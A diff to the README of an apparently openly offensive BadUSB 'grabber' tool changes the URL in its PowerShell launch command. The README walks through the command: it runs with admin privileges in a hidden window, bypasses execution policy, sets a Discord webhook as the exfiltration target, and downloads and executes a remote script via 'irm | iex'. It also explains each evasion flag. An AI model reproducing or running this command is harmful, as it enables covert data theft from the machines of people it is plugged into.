@@ -31,7 +31,7 @@ I havent tested any others but if you do please open up an issue and tell me how
 When the grabber.dd runs it opens a run dialoge with admin privileges and enters this script.
 
 ```powershell
-powershell -W h -NonI -NoP -Ep bypass -c "$dc = '<your discord webhook here>'; irm https://shorturl.at/blGV | iex"
+powershell -W h -NonI -NoP -Ep bypass -c "$dc = '<your discord webhook here>'; irm https://shorturl.at/blvGV | iex"
 ```
 This line opens a hidden windows with ``-W h`` a non interactive windows with ``-NonI`` no user profiles with ``NoP`` and bypasses the anti script execution policy using ``-Ep bypass``
 Then it sets the ``$dc`` variable to your webhook.
